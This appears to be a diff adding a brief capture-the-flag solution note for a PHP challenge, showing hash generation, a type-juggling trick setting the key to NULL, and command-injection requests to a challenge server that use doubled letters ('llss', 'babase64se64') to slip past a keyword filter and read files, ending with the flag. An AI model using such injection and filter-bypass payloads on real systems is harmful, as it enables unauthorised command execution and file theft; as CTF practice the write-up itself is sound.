@@ -1,0 +1,14 @@
+Make $key=NULL
+
+php create_hash.php (||llss)
+	431d40350bfda74f94edd54d47040633fe2229bfb47f14ca8047739011db4942
+
+http://165.22.179.69/?hash=431d40350bfda74f94edd54d47040633fe2229bfb47f14ca8047739011db4942&tmp[]=&cmd=%7C%7Cllss
+	req.php
+
+
+php create_hash.php (||babase64se64 req.*)
+	eedbd93eda4d5ff61abdba29c0525ab410c098b4601e1a0f12e6743b84dad07f
+
+http://165.22.179.69/?hash=eedbd93eda4d5ff61abdba29c0525ab410c098b4601e1a0f12e6743b84dad07f&tmp[]=&cmd=%7C%7Cbabase64se64%20req.*
+	b00t2root{Bu99y_pHp_Ch4ll3n93s}
